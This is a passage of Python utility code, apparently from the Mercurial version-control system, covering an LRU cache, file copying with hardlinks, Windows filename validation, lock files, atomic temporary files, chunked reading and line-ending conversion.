        self._movetohead(node)
        self._head = node.next

    # Additional dict methods.

    def get(self, k, default=None):
        try:
            return self.__getitem__(k)
        except KeyError:
            return default

    def clear(self):
        n = self._head
        while n.key is not _notset:
            self.totalcost -= n.cost
            n.markempty()
            n = n.next

        self._cache.clear()

    def copy(self, capacity=None, maxcost=0):
        """Create a new cache as a copy of the current one.

        By default, the new cache has the same capacity as the existing one.
        But, the cache capacity can be changed as part of performing the
        copy.

        Items in the copy have an insertion/access order matching this
        instance.
        """

        capacity = capacity or self.capacity
        maxcost = maxcost or self.maxcost
        result = lrucachedict(capacity, maxcost=maxcost)

        # We copy entries by iterating in oldest-to-newest order so the copy
        # has the correct ordering.

        # Find the first non-empty entry.
        n = self._head.prev
        while n.key is _notset and n is not self._head:
            n = n.prev

        # We could potentially skip the first N items when decreasing capacity.
        # But let's keep it simple unless it is a performance problem.
        for i in range(len(self._cache)):
            result.insert(n.key, n.value, cost=n.cost)
            n = n.prev

        return result

    def popoldest(self):
        """Remove the oldest item from the cache.

        Returns the (key, value) describing the removed cache entry.
        """
        if not self._cache:
            return

        # Walk the linked list backwards starting at tail node until we hit
        # a non-empty node.
        n = self._head.prev
        while n.key is _notset:
            n = n.prev

        key, value = n.key, n.value

        # And remove it from the cache and mark it as empty.
        del self._cache[n.key]
        self.totalcost -= n.cost
        n.markempty()

        return key, value

    def _movetohead(self, node):
        """Mark a node as the newest, making it the new head.

        When a node is accessed, it becomes the freshest entry in the LRU
        list, which is denoted by self._head.

        Visually, let's make ``N`` the new head node (* denotes head):

            previous/oldest <-> head <-> next/next newest

            ----<->--- A* ---<->-----
            |                       |
            E <-> D <-> N <-> C <-> B

        To:

            ----<->--- N* ---<->-----
            |                       |
            E <-> D <-> C <-> B <-> A

        This requires the following moves:

           C.next = D  (node.prev.next = node.next)
           D.prev = C  (node.next.prev = node.prev)
           E.next = N  (head.prev.next = node)
           N.prev = E  (node.prev = head.prev)
           N.next = A  (node.next = head)
           A.prev = N  (head.prev = node)
        """
        head = self._head
        # C.next = D
        node.prev.next = node.next
        # D.prev = C
        node.next.prev = node.prev
        # N.prev = E
        node.prev = head.prev
        # N.next = A
        # It is tempting to do just "head" here, however if node is
        # adjacent to head, this will do bad things.
        node.next = head.prev.next
        # E.next = N
        node.next.prev = node
        # A.prev = N
        node.prev.next = node

        self._head = node

    def _addcapacity(self):
        """Add a node to the circular linked list.

        The new node is inserted before the head node.
        """
        head = self._head
        node = _lrucachenode()
        head.prev.next = node
        node.prev = head.prev
        node.next = head
        head.prev = node
        self._size += 1
        return node

    def _enforcecostlimit(self):
        # This should run after an insertion. It should only be called if total
        # cost limits are being enforced.
        # The most recently inserted node is never evicted.
        if len(self) <= 1 or self.totalcost <= self.maxcost:
            return

        # This is logically equivalent to calling popoldest() until we
        # free up enough cost. We don't do that since popoldest() needs
        # to walk the linked list and doing this in a loop would be
        # quadratic. So we find the first non-empty node and then
        # walk nodes until we free up enough capacity.
        #
        # If we only removed the minimum number of nodes to free enough
        # cost at insert time, chances are high that the next insert would
        # also require pruning. This would effectively constitute quadratic
        # behavior for insert-heavy workloads. To mitigate this, we set a
        # target cost that is a percentage of the max cost. This will tend
        # to free more nodes when the high water mark is reached, which
        # lowers the chances of needing to prune on the subsequent insert.
        targetcost = int(self.maxcost * 0.75)

        n = self._head.prev
        while n.key is _notset:
            n = n.prev

        while len(self) > 1 and self.totalcost > targetcost:
            del self._cache[n.key]
            self.totalcost -= n.cost
            n.markempty()
            n = n.prev

def lrucachefunc(func):
    '''cache most recent results of function calls'''
    cache = {}
    order = collections.deque()
    if func.__code__.co_argcount == 1:
        def f(arg):
            if arg not in cache:
                if len(cache) > 20:
                    del cache[order.popleft()]
                cache[arg] = func(arg)
            else:
                order.remove(arg)
            order.append(arg)
            return cache[arg]
    else:
        def f(*args):
            if args not in cache:
                if len(cache) > 20:
                    del cache[order.popleft()]
                cache[args] = func(*args)
            else:
                order.remove(args)
            order.append(args)
            return cache[args]

    return f

class propertycache(object):
    def __init__(self, func):
        self.func = func
        self.name = func.__name__
    def __get__(self, obj, type=None):
        result = self.func(obj)
        self.cachevalue(obj, result)
        return result

    def cachevalue(self, obj, value):
        # __dict__ assignment required to bypass __setattr__ (eg: repoview)
        obj.__dict__[self.name] = value

def clearcachedproperty(obj, prop):
    '''clear a cached property value, if one has been set'''
    if prop in obj.__dict__:
        del obj.__dict__[prop]

def increasingchunks(source, min=1024, max=65536):
    '''return no less than min bytes per chunk while data remains,
    doubling min after each chunk until it reaches max'''
    def log2(x):
        if not x:
            return 0
        i = 0
        while x:
            x >>= 1
            i += 1
        return i - 1

    buf = []
    blen = 0
    for chunk in source:
        buf.append(chunk)
        blen += len(chunk)
        if blen >= min:
            if min < max:
                min = min << 1
                nmin = 1 << log2(blen)
                if nmin > min:
                    min = nmin
                if min > max:
                    min = max
            yield ''.join(buf)
            blen = 0
            buf = []
    if buf:
        yield ''.join(buf)

def always(fn):
    return True

def never(fn):
    return False

def nogc(func):
    """disable garbage collector

    Python's garbage collector triggers a GC each time a certain number of
    container objects (the number being defined by gc.get_threshold()) are
    allocated even when marked not to be tracked by the collector. Tracking has
    no effect on when GCs are triggered, only on what objects the GC looks
    into. As a workaround, disable GC while building complex (huge)
    containers.

    This garbage collector issue have been fixed in 2.7. But it still affect
    CPython's performance.
    """
    def wrapper(*args, **kwargs):
        gcenabled = gc.isenabled()
        gc.disable()
        try:
            return func(*args, **kwargs)
        finally:
            if gcenabled:
                gc.enable()
    return wrapper

if pycompat.ispypy:
    # PyPy runs slower with gc disabled
    nogc = lambda x: x

def pathto(root, n1, n2):
    '''return the relative path from one place to another.
    root should use os.sep to separate directories
    n1 should use os.sep to separate directories
    n2 should use "/" to separate directories
    returns an os.sep-separated path.

    If n1 is a relative path, it's assumed it's
    relative to root.
    n2 should always be relative to root.
    '''
    if not n1:
        return localpath(n2)
    if os.path.isabs(n1):
        if os.path.splitdrive(root)[0] != os.path.splitdrive(n1)[0]:
            return os.path.join(root, localpath(n2))
        n2 = '/'.join((pconvert(root), n2))
    a, b = splitpath(n1), n2.split('/')
    a.reverse()
    b.reverse()
    while a and b and a[-1] == b[-1]:
        a.pop()
        b.pop()
    b.reverse()
    return pycompat.ossep.join((['..'] * len(a)) + b) or '.'

# the location of data files matching the source code
if procutil.mainfrozen() and getattr(sys, 'frozen', None) != 'macosx_app':
    # executable version (py2exe) doesn't support __file__
    datapath = os.path.dirname(pycompat.sysexecutable)
elif __file__.startswith("/usr/lib/python"):
    datapath = "/usr/share/mercurial"
else:
    datapath = os.path.dirname(pycompat.fsencode(__file__))

i18n.setdatapath(datapath)

def checksignature(func):
    '''wrap a function with code to check for calling errors'''
    def check(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except TypeError:
            if len(traceback.extract_tb(sys.exc_info()[2])) == 1:
                raise error.SignatureError
            raise

    return check

# a whilelist of known filesystems where hardlink works reliably
_hardlinkfswhitelist = {
    'apfs',
    'btrfs',
    'ext2',
    'ext3',
    'ext4',
    'hfs',
    'jfs',
    'NTFS',
    'reiserfs',
    'tmpfs',
    'ufs',
    'xfs',
    'zfs',
}

def copyfile(src, dest, hardlink=False, copystat=False, checkambig=False):
    '''copy a file, preserving mode and optionally other stat info like
    atime/mtime

    checkambig argument is used with filestat, and is useful only if
    destination file is guarded by any lock (e.g. repo.lock or
    repo.wlock).

    copystat and checkambig should be exclusive.
    '''
    assert not (copystat and checkambig)
    oldstat = None
    if os.path.lexists(dest):
        if checkambig:
            oldstat = checkambig and filestat.frompath(dest)
        unlink(dest)
    if hardlink:
        # Hardlinks are problematic on CIFS (issue4546), do not allow hardlinks
        # unless we are confident that dest is on a whitelisted filesystem.
        try:
            fstype = getfstype(os.path.dirname(dest))
        except OSError:
            fstype = None
        if fstype not in _hardlinkfswhitelist:
            hardlink = False
    if hardlink:
        try:
            oslink(src, dest)
            return
        except (IOError, OSError):
            pass # fall back to normal copy
    if os.path.islink(src):
        os.symlink(os.readlink(src), dest)
        # copytime is ignored for symlinks, but in general copytime isn't needed
        # for them anyway
    else:
        try:
            shutil.copyfile(src, dest)
            if copystat:
                # copystat also copies mode
                shutil.copystat(src, dest)
            else:
                shutil.copymode(src, dest)
                if oldstat and oldstat.stat:
                    newstat = filestat.frompath(dest)
                    if newstat.isambig(oldstat):
                        # stat of copied file is ambiguous to original one
                        advanced = (
                            oldstat.stat[stat.ST_MTIME] + 1) & 0x7fffffff
                        os.utime(dest, (advanced, advanced))
        except shutil.Error as inst:
            raise error.Abort(str(inst))

def copyfiles(src, dst, hardlink=None, progress=None):
    """Copy a directory tree using hardlinks if possible."""
    num = 0

    def settopic():
        if progress:
            progress.topic = _('linking') if hardlink else _('copying')

    if os.path.isdir(src):
        if hardlink is None:
            hardlink = (os.stat(src).st_dev ==
                        os.stat(os.path.dirname(dst)).st_dev)
        settopic()
        os.mkdir(dst)
        for name, kind in listdir(src):
            srcname = os.path.join(src, name)
            dstname = os.path.join(dst, name)
            hardlink, n = copyfiles(srcname, dstname, hardlink, progress)
            num += n
    else:
        if hardlink is None:
            hardlink = (os.stat(os.path.dirname(src)).st_dev ==
                        os.stat(os.path.dirname(dst)).st_dev)
        settopic()

        if hardlink:
            try:
                oslink(src, dst)
            except (IOError, OSError):
                hardlink = False
                shutil.copy(src, dst)
        else:
            shutil.copy(src, dst)
        num += 1
        if progress:
            progress.increment()

    return hardlink, num

_winreservednames = {
    'con', 'prn', 'aux', 'nul',
    'com1', 'com2', 'com3', 'com4', 'com5', 'com6', 'com7', 'com8', 'com9',
    'lpt1', 'lpt2', 'lpt3', 'lpt4', 'lpt5', 'lpt6', 'lpt7', 'lpt8', 'lpt9',
}
_winreservedchars = ':*?"<>|'
def checkwinfilename(path):
    r'''Check that the base-relative path is a valid filename on Windows.
    Returns None if the path is ok, or a UI string describing the problem.

    >>> checkwinfilename(b"just/a/normal/path")
    >>> checkwinfilename(b"foo/bar/con.xml")
    "filename contains 'con', which is reserved on Windows"
    >>> checkwinfilename(b"foo/con.xml/bar")
    "filename contains 'con', which is reserved on Windows"
    >>> checkwinfilename(b"foo/bar/xml.con")
    >>> checkwinfilename(b"foo/bar/AUX/bla.txt")
    "filename contains 'AUX', which is reserved on Windows"
    >>> checkwinfilename(b"foo/bar/bla:.txt")
    "filename contains ':', which is reserved on Windows"
    >>> checkwinfilename(b"foo/bar/b\07la.txt")
    "filename contains '\\x07', which is invalid on Windows"
    >>> checkwinfilename(b"foo/bar/bla ")
    "filename ends with ' ', which is not allowed on Windows"
    >>> checkwinfilename(b"../bar")
    >>> checkwinfilename(b"foo\\")
    "filename ends with '\\', which is invalid on Windows"
    >>> checkwinfilename(b"foo\\/bar")
    "directory name ends with '\\', which is invalid on Windows"
    '''
    if path.endswith('\\'):
        return _("filename ends with '\\', which is invalid on Windows")
    if '\\/' in path:
        return _("directory name ends with '\\', which is invalid on Windows")
    for n in path.replace('\\', '/').split('/'):
        if not n:
            continue
        for c in _filenamebytestr(n):
            if c in _winreservedchars:
                return _("filename contains '%s', which is reserved "
                         "on Windows") % c
            if ord(c) <= 31:
                return _("filename contains '%s', which is invalid "
                         "on Windows") % stringutil.escapestr(c)
        base = n.split('.')[0]
        if base and base.lower() in _winreservednames:
            return _("filename contains '%s', which is reserved "
                     "on Windows") % base
        t = n[-1:]
        if t in '. ' and n not in '..':
            return _("filename ends with '%s', which is not allowed "
                     "on Windows") % t

if pycompat.iswindows:
    checkosfilename = checkwinfilename
    timer = time.clock
else:
    checkosfilename = platform.checkosfilename
    timer = time.time

if safehasattr(time, "perf_counter"):
    timer = time.perf_counter

def makelock(info, pathname):
    """Create a lock file atomically if possible

    This may leave a stale lock file if symlink isn't supported and signal
    interrupt is enabled.
    """
    try:
        return os.symlink(info, pathname)
    except OSError as why:
        if why.errno == errno.EEXIST:
            raise
    except AttributeError: # no symlink in os
        pass

    flags = os.O_CREAT | os.O_WRONLY | os.O_EXCL | getattr(os, 'O_BINARY', 0)
    ld = os.open(pathname, flags)
    os.write(ld, info)
    os.close(ld)

def readlock(pathname):
    try:
        return readlink(pathname)
    except OSError as why:
        if why.errno not in (errno.EINVAL, errno.ENOSYS):
            raise
    except AttributeError: # no symlink in os
        pass
    with posixfile(pathname, 'rb') as fp:
        return fp.read()

def fstat(fp):
    '''stat file object that may not have fileno method.'''
    try:
        return os.fstat(fp.fileno())
    except AttributeError:
        return os.stat(fp.name)

# File system features

def fscasesensitive(path):
    """
    Return true if the given path is on a case-sensitive filesystem

    Requires a path (like /foo/.hg) ending with a foldable final
    directory component.
    """
    s1 = os.lstat(path)
    d, b = os.path.split(path)
    b2 = b.upper()
    if b == b2:
        b2 = b.lower()
        if b == b2:
            return True # no evidence against case sensitivity
    p2 = os.path.join(d, b2)
    try:
        s2 = os.lstat(p2)
        if s2 == s1:
            return False
        return True
    except OSError:
        return True

try:
    import re2
    _re2 = None
except ImportError:
    _re2 = False

class _re(object):
    def _checkre2(self):
        global _re2
        try:
            # check if match works, see issue3964
            _re2 = bool(re2.match(r'\[([^\[]+)\]', '[ui]'))
        except ImportError:
            _re2 = False

    def compile(self, pat, flags=0):
        '''Compile a regular expression, using re2 if possible

        For best performance, use only re2-compatible regexp features. The
        only flags from the re module that are re2-compatible are
        IGNORECASE and MULTILINE.'''
        if _re2 is None:
            self._checkre2()
        if _re2 and (flags & ~(remod.IGNORECASE | remod.MULTILINE)) == 0:
            if flags & remod.IGNORECASE:
                pat = '(?i)' + pat
            if flags & remod.MULTILINE:
                pat = '(?m)' + pat
            try:
                return re2.compile(pat)
            except re2.error:
                pass
        return remod.compile(pat, flags)

    @propertycache
    def escape(self):
        '''Return the version of escape corresponding to self.compile.

        This is imperfect because whether re2 or re is used for a particular
        function depends on the flags, etc, but it's the best we can do.
        '''
        global _re2
        if _re2 is None:
            self._checkre2()
        if _re2:
            return re2.escape
        else:
            return remod.escape

re = _re()

_fspathcache = {}
def fspath(name, root):
    '''Get name in the case stored in the filesystem

    The name should be relative to root, and be normcase-ed for efficiency.

    Note that this function is unnecessary, and should not be
    called, for case-sensitive filesystems (simply because it's expensive).

    The root should be normcase-ed, too.
    '''
    def _makefspathcacheentry(dir):
        return dict((normcase(n), n) for n in os.listdir(dir))

    seps = pycompat.ossep
    if pycompat.osaltsep:
        seps = seps + pycompat.osaltsep
    # Protect backslashes. This gets silly very quickly.
    seps.replace('\\','\\\\')
    pattern = remod.compile(br'([^%s]+)|([%s]+)' % (seps, seps))
    dir = os.path.normpath(root)
    result = []
    for part, sep in pattern.findall(name):
        if sep:
            result.append(sep)
            continue

        if dir not in _fspathcache:
            _fspathcache[dir] = _makefspathcacheentry(dir)
        contents = _fspathcache[dir]

        found = contents.get(part)
        if not found:
            # retry "once per directory" per "dirstate.walk" which
            # may take place for each patches of "hg qpush", for example
            _fspathcache[dir] = contents = _makefspathcacheentry(dir)
            found = contents.get(part)

        result.append(found or part)
        dir = os.path.join(dir, part)

    return ''.join(result)

def checknlink(testfile):
    '''check whether hardlink count reporting works properly'''

    # testfile may be open, so we need a separate file for checking to
    # work around issue2543 (or testfile may get lost on Samba shares)
    f1, f2, fp = None, None, None
    try:
        fd, f1 = pycompat.mkstemp(prefix='.%s-' % os.path.basename(testfile),
                                  suffix='1~', dir=os.path.dirname(testfile))
        os.close(fd)
        f2 = '%s2~' % f1[:-2]

        oslink(f1, f2)
        # nlinks() may behave differently for files on Windows shares if
        # the file is open.
        fp = posixfile(f2)
        return nlinks(f2) > 1
    except OSError:
        return False
    finally:
        if fp is not None:
            fp.close()
        for f in (f1, f2):
            try:
                if f is not None:
                    os.unlink(f)
            except OSError:
                pass

def endswithsep(path):
    '''Check path ends with os.sep or os.altsep.'''
    return (path.endswith(pycompat.ossep)
            or pycompat.osaltsep and path.endswith(pycompat.osaltsep))

def splitpath(path):
    '''Split path by os.sep.
    Note that this function does not use os.altsep because this is
    an alternative of simple "xxx.split(os.sep)".
    It is recommended to use os.path.normpath() before using this
    function if need.'''
    return path.split(pycompat.ossep)

def mktempcopy(name, emptyok=False, createmode=None):
    """Create a temporary file with the same contents from name

    The permission bits are copied from the original file.

    If the temporary file is going to be truncated immediately, you
    can use emptyok=True as an optimization.

    Returns the name of the temporary file.
    """
    d, fn = os.path.split(name)
    fd, temp = pycompat.mkstemp(prefix='.%s-' % fn, suffix='~', dir=d)
    os.close(fd)
    # Temporary files are created with mode 0600, which is usually not
    # what we want.  If the original file already exists, just copy
    # its mode.  Otherwise, manually obey umask.
    copymode(name, temp, createmode)
    if emptyok:
        return temp
    try:
        try:
            ifp = posixfile(name, "rb")
        except IOError as inst:
            if inst.errno == errno.ENOENT:
                return temp
            if not getattr(inst, 'filename', None):
                inst.filename = name
            raise
        ofp = posixfile(temp, "wb")
        for chunk in filechunkiter(ifp):
            ofp.write(chunk)
        ifp.close()
        ofp.close()
    except: # re-raises
        try:
            os.unlink(temp)
        except OSError:
            pass
        raise
    return temp

class filestat(object):
    """help to exactly detect change of a file

    'stat' attribute is result of 'os.stat()' if specified 'path'
    exists. Otherwise, it is None. This can avoid preparative
    'exists()' examination on client side of this class.
    """
    def __init__(self, stat):
        self.stat = stat

    @classmethod
    def frompath(cls, path):
        try:
            stat = os.stat(path)
        except OSError as err:
            if err.errno != errno.ENOENT:
                raise
            stat = None
        return cls(stat)

    @classmethod
    def fromfp(cls, fp):
        stat = os.fstat(fp.fileno())
        return cls(stat)

    __hash__ = object.__hash__

    def __eq__(self, old):
        try:
            # if ambiguity between stat of new and old file is
            # avoided, comparison of size, ctime and mtime is enough
            # to exactly detect change of a file regardless of platform
            return (self.stat.st_size == old.stat.st_size and
                    self.stat[stat.ST_CTIME] == old.stat[stat.ST_CTIME] and
                    self.stat[stat.ST_MTIME] == old.stat[stat.ST_MTIME])
        except AttributeError:
            pass
        try:
            return self.stat is None and old.stat is None
        except AttributeError:
            return False

    def isambig(self, old):
        """Examine whether new (= self) stat is ambiguous against old one

        "S[N]" below means stat of a file at N-th change:

        - S[n-1].ctime  < S[n].ctime: can detect change of a file
        - S[n-1].ctime == S[n].ctime
          - S[n-1].ctime  < S[n].mtime: means natural advancing (*1)
          - S[n-1].ctime == S[n].mtime: is ambiguous (*2)
          - S[n-1].ctime  > S[n].mtime: never occurs naturally (don't care)
        - S[n-1].ctime  > S[n].ctime: never occurs naturally (don't care)

        Case (*2) above means that a file was changed twice or more at
        same time in sec (= S[n-1].ctime), and comparison of timestamp
        is ambiguous.

        Base idea to avoid such ambiguity is "advance mtime 1 sec, if
        timestamp is ambiguous".

        But advancing mtime only in case (*2) doesn't work as
        expected, because naturally advanced S[n].mtime in case (*1)
        might be equal to manually advanced S[n-1 or earlier].mtime.

        Therefore, all "S[n-1].ctime == S[n].ctime" cases should be
        treated as ambiguous regardless of mtime, to avoid overlooking
        by confliction between such mtime.

        Advancing mtime "if isambig(oldstat)" ensures "S[n-1].mtime !=
        S[n].mtime", even if size of a file isn't changed.
        """
        try:
            return (self.stat[stat.ST_CTIME] == old.stat[stat.ST_CTIME])
        except AttributeError:
            return False

    def avoidambig(self, path, old):
        """Change file stat of specified path to avoid ambiguity

        'old' should be previous filestat of 'path'.

        This skips avoiding ambiguity, if a process doesn't have
        appropriate privileges for 'path'. This returns False in this
        case.

        Otherwise, this returns True, as "ambiguity is avoided".
        """
        advanced = (old.stat[stat.ST_MTIME] + 1) & 0x7fffffff
        try:
            os.utime(path, (advanced, advanced))
        except OSError as inst:
            if inst.errno == errno.EPERM:
                # utime() on the file created by another user causes EPERM,
                # if a process doesn't have appropriate privileges
                return False
            raise
        return True

    def __ne__(self, other):
        return not self == other

class atomictempfile(object):
    '''writable file object that atomically updates a file

    All writes will go to a temporary copy of the original file. Call
    close() when you are done writing, and atomictempfile will rename
    the temporary copy to the original name, making the changes
    visible. If the object is destroyed without being closed, all your
    writes are discarded.

    checkambig argument of constructor is used with filestat, and is
    useful only if target file is guarded by any lock (e.g. repo.lock
    or repo.wlock).
    '''
    def __init__(self, name, mode='w+b', createmode=None, checkambig=False):
        self.__name = name      # permanent name
        self._tempname = mktempcopy(name, emptyok=('w' in mode),
                                    createmode=createmode)
        self._fp = posixfile(self._tempname, mode)
        self._checkambig = checkambig

        # delegated methods
        self.read = self._fp.read
        self.write = self._fp.write
        self.seek = self._fp.seek
        self.tell = self._fp.tell
        self.fileno = self._fp.fileno

    def close(self):
        if not self._fp.closed:
            self._fp.close()
            filename = localpath(self.__name)
            oldstat = self._checkambig and filestat.frompath(filename)
            if oldstat and oldstat.stat:
                rename(self._tempname, filename)
                newstat = filestat.frompath(filename)
                if newstat.isambig(oldstat):
                    # stat of changed file is ambiguous to original one
                    advanced = (oldstat.stat[stat.ST_MTIME] + 1) & 0x7fffffff
                    os.utime(filename, (advanced, advanced))
            else:
                rename(self._tempname, filename)

    def discard(self):
        if not self._fp.closed:
            try:
                os.unlink(self._tempname)
            except OSError:
                pass
            self._fp.close()

    def __del__(self):
        if safehasattr(self, '_fp'): # constructor actually did something
            self.discard()

    def __enter__(self):
        return self

    def __exit__(self, exctype, excvalue, traceback):
        if exctype is not None:
            self.discard()
        else:
            self.close()

def unlinkpath(f, ignoremissing=False, rmdir=True):
    """unlink and remove the directory if it is empty"""
    if ignoremissing:
        tryunlink(f)
    else:
        unlink(f)
    if rmdir:
        # try removing directories that might now be empty
        try:
            removedirs(os.path.dirname(f))
        except OSError:
            pass

def tryunlink(f):
    """Attempt to remove a file, ignoring ENOENT errors."""
    try:
        unlink(f)
    except OSError as e:
        if e.errno != errno.ENOENT:
            raise

def makedirs(name, mode=None, notindexed=False):
    """recursive directory creation with parent mode inheritance

    Newly created directories are marked as "not to be indexed by
    the content indexing service", if ``notindexed`` is specified
    for "write" mode access.
    """
    try:
        makedir(name, notindexed)
    except OSError as err:
        if err.errno == errno.EEXIST:
            return
        if err.errno != errno.ENOENT or not name:
            raise
        parent = os.path.dirname(os.path.abspath(name))
        if parent == name:
            raise
        makedirs(parent, mode, notindexed)
        try:
            makedir(name, notindexed)
        except OSError as err:
            # Catch EEXIST to handle races
            if err.errno == errno.EEXIST:
                return
            raise
    if mode is not None:
        os.chmod(name, mode)

def readfile(path):
    with open(path, 'rb') as fp:
        return fp.read()

def writefile(path, text):
    with open(path, 'wb') as fp:
        fp.write(text)

def appendfile(path, text):
    with open(path, 'ab') as fp:
        fp.write(text)

class chunkbuffer(object):
    """Allow arbitrary sized chunks of data to be efficiently read from an
    iterator over chunks of arbitrary size."""

    def __init__(self, in_iter):
        """in_iter is the iterator that's iterating over the input chunks."""
        def splitbig(chunks):
            for chunk in chunks:
                if len(chunk) > 2**20:
                    pos = 0
                    while pos < len(chunk):
                        end = pos + 2 ** 18
                        yield chunk[pos:end]
                        pos = end
                else:
                    yield chunk
        self.iter = splitbig(in_iter)
        self._queue = collections.deque()
        self._chunkoffset = 0

    def read(self, l=None):
        """Read L bytes of data from the iterator of chunks of data.
        Returns less than L bytes if the iterator runs dry.

        If size parameter is omitted, read everything"""
        if l is None:
            return ''.join(self.iter)

        left = l
        buf = []
        queue = self._queue
        while left > 0:
            # refill the queue
            if not queue:
                target = 2**18
                for chunk in self.iter:
                    queue.append(chunk)
                    target -= len(chunk)
                    if target <= 0:
                        break
                if not queue:
                    break

            # The easy way to do this would be to queue.popleft(), modify the
            # chunk (if necessary), then queue.appendleft(). However, for cases
            # where we read partial chunk content, this incurs 2 dequeue
            # mutations and creates a new str for the remaining chunk in the
            # queue. Our code below avoids this overhead.

            chunk = queue[0]
            chunkl = len(chunk)
            offset = self._chunkoffset

            # Use full chunk.
            if offset == 0 and left >= chunkl:
                left -= chunkl
                queue.popleft()
                buf.append(chunk)
                # self._chunkoffset remains at 0.
                continue

            chunkremaining = chunkl - offset

            # Use all of unconsumed part of chunk.
            if left >= chunkremaining:
                left -= chunkremaining
                queue.popleft()
                # offset == 0 is enabled by block above, so this won't merely
                # copy via ``chunk[0:]``.
                buf.append(chunk[offset:])
                self._chunkoffset = 0

            # Partial chunk needed.
            else:
                buf.append(chunk[offset:offset + left])
                self._chunkoffset += left
                left -= chunkremaining

        return ''.join(buf)

def filechunkiter(f, size=131072, limit=None):
    """Create a generator that produces the data in the file size
    (default 131072) bytes at a time, up to optional limit (default is
    to read all data).  Chunks may be less than size bytes if the
    chunk is the last chunk in the file, or the file is a socket or
    some other type of file that sometimes reads less data than is
    requested."""
    assert size >= 0
    assert limit is None or limit >= 0
    while True:
        if limit is None:
            nbytes = size
        else:
            nbytes = min(limit, size)
        s = nbytes and f.read(nbytes)
        if not s:
            break
        if limit:
            limit -= len(s)
        yield s

class cappedreader(object):
    """A file object proxy that allows reading up to N bytes.

    Given a source file object, instances of this type allow reading up to
    N bytes from that source file object. Attempts to read past the allowed
    limit are treated as EOF.

    It is assumed that I/O is not performed on the original file object
    in addition to I/O that is performed by this instance. If there is,
    state tracking will get out of sync and unexpected results will ensue.
    """
    def __init__(self, fh, limit):
        """Allow reading up to <limit> bytes from <fh>."""
        self._fh = fh
        self._left = limit

    def read(self, n=-1):
        if not self._left:
            return b''

        if n < 0:
            n = self._left

        data = self._fh.read(min(n, self._left))
        self._left -= len(data)
        assert self._left >= 0

        return data

    def readinto(self, b):
        res = self.read(len(b))
        if res is None:
            return None

        b[0:len(res)] = res
        return len(res)

def unitcountfn(*unittable):
    '''return a function that renders a readable count of some quantity'''

    def go(count):
        for multiplier, divisor, format in unittable:
            if abs(count) >= divisor * multiplier:
                return format % (count / float(divisor))
        return unittable[-1][2] % count

    return go

def processlinerange(fromline, toline):
    """Check that linerange <fromline>:<toline> makes sense and return a
    0-based range.

    >>> processlinerange(10, 20)
    (9, 20)
    >>> processlinerange(2, 1)
    Traceback (most recent call last):
        ...
    ParseError: line range must be positive
    >>> processlinerange(0, 5)
    Traceback (most recent call last):
        ...
    ParseError: fromline must be strictly positive
    """
    if toline - fromline < 0:
        raise error.ParseError(_("line range must be positive"))
    if fromline < 1:
        raise error.ParseError(_("fromline must be strictly positive"))
    return fromline - 1, toline

bytecount = unitcountfn(
    (100, 1 << 30, _('%.0f GB')),
    (10, 1 << 30, _('%.1f GB')),
    (1, 1 << 30, _('%.2f GB')),
    (100, 1 << 20, _('%.0f MB')),
    (10, 1 << 20, _('%.1f MB')),
    (1, 1 << 20, _('%.2f MB')),
    (100, 1 << 10, _('%.0f KB')),
    (10, 1 << 10, _('%.1f KB')),
    (1, 1 << 10, _('%.2f KB')),
    (1, 1, _('%.0f bytes')),
    )

class transformingwriter(object):
    """Writable file wrapper to transform data by function"""

    def __init__(self, fp, encode):
        self._fp = fp
        self._encode = encode

    def close(self):
        self._fp.close()

    def flush(self):
        self._fp.flush()

    def write(self, data):
        return self._fp.write(self._encode(data))

# Matches a single EOL which can either be a CRLF where repeated CR
# are removed or a LF. We do not care about old Macintosh files, so a
# stray CR is an error.
_eolre = remod.compile(br'\r*\n')

def tolf(s):
    return _eolre.sub('\n', s)

def tocrlf(s):
    return _eolre.sub('\r\n', s)

def _crlfwriter(fp):
    return transformingwriter(fp, tocrlf)

if pycompat.oslinesep == '\r\n':
    tonativeeol = tocrlf
    fromnativeeol = tolf
    nativeeolwriter = _crlfwriter
else:
    tonativeeol = pycompat.identity
    fromnativeeol = pycompat.identity
    nativeeolwriter = pycompat.identity

if (pyplatform.python_implementation() == 'CPython' and
    sys.version_info < (3, 0)):
    # There is an issue in CPython that some IO methods do not handle EINTR
    # correctly. The following table shows what CPython version (and functions)
    # are affected (buggy: has the EINTR bug, okay: otherwise):
    #
    #                | < 2.7.4 | 2.7.4 to 2.7.12 | >= 3.0
    #   --------------------------------------------------
    #    fp.__iter__ | buggy   | buggy           | okay
    #    fp.read*    | buggy   | okay [1]        | okay
    #
    # [1]: fixed by changeset 67dc99a989cd in the cpython hg repo.
    #
    # Here we workaround the EINTR issue for fileobj.__iter__. Other methods
    # like "read*" are ignored for now, as Python < 2.7.4 is a minority.
    #
    # Although we can workaround the EINTR issue for fp.__iter__, it is slower:
    # "for x in fp" is 4x faster than "for x in iter(fp.readline, '')" in
    # CPython 2, because CPython 2 maintains an internal readahead buffer for
    # fp.__iter__ but not other fp.read* methods.
    #
    # On modern systems like Linux, the "read" syscall cannot be interrupted
    # when reading "fast" files like on-disk files. So the EINTR issue only
    # affects things like pipes, sockets, ttys etc. We treat "normal" (S_ISREG)
    # files approximately as "fast" files and use the fast (unsafe) code path,
    # to minimize the performance impact.
    if sys.version_info >= (2, 7, 4):
        # fp.readline deals with EINTR correctly, use it as a workaround.
        def _safeiterfile(fp):
            return iter(fp.readline, '')
    else:
        # fp.read* are broken too, manually deal with EINTR in a stupid way.
        # note: this may block longer than necessary because of bufsize.
        def _safeiterfile(fp, bufsize=4096):
            fd = fp.fileno()
            line = ''
            while True:
                try:
                    buf = os.read(fd, bufsize)
                except OSError as ex:
                    # os.read only raises EINTR before any data is read
                    if ex.errno == errno.EINTR:
                        continue
                    else:
                        raise
                line += buf
                if '\n' in buf:
                    splitted = line.splitlines(True)
                    line = ''
                    for l in splitted:
                        if l[-1] == '\n':
                            yield l
                        else:
                            line = l
                if not buf:
                    break
            if line:
                yield line

    def iterfile(fp):
        fastpath = True
        if type(fp) is file:
            fastpath = stat.S_ISREG(os.fstat(fp.fileno()).st_mode)
        if fastpath:
            return fp
        else:
            return _safeiterfile(fp)
else:
    # PyPy and CPython 3 do not have the EINTR issue thus no workaround needed.
    def iterfile(fp):
        return fp

def iterlines(iterator):
    for chunk in iterator:
        for line in chunk.splitlines():
            yield line

def expandpath(path):
    return os.path.expanduser(os.path.expandvars(path))

def interpolate(prefix, mapping, s, fn=None, escape_prefix=False):
    """Return the result of interpolating items in the mapping into string s.

    prefix is a single character string, or a two character string with
    a backslash as the first character if the prefix needs to be escaped in
    a regular expression.

